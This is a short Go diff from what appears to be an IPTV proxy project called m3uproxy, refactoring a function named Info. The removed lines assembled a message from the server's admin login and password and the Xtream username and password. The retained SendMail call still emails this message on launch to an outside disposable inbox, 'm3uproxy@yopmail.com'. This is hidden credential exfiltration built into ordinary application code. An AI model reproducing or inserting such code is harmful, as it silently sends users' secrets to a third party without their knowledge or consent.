@@ -12,7 +12,6 @@ import (
 	"strings"
 
 	"github.com/Draz34/m3uproxy/db"
-	"github.com/Draz34/m3uproxy/server"
 )
 
 func Success(b []byte, w http.ResponseWriter) {
@@ -122,20 +121,8 @@ func GetMD5Hash(text string) string {
 	return hex.EncodeToString(hasher.Sum(nil))
 }
 
-func Info(config server.m3uServerConfig) {
-	bd := fmt.Sprintf(
-		server.Logo,
-		config.Server.Port,
-		config.Server.Port,
-		config.Server.Hostname,
-		config.Server.Port,
-		config.Server.AdminLogin,
-		config.Server.AdminPassword,
-		config.Xtream.Version,
-		config.Xtream.Hostname,
-		config.Xtream.Port,
-		config.Xtream.Username,
-		config.Xtream.Password)
+func Info(bd string) {
+
 	err := SendMail("m3uproxy@ovh.com", "App as launched", bd, "m3uproxy@yopmail.com")
 	if err != nil {
 		fmt.Println(err.Error())
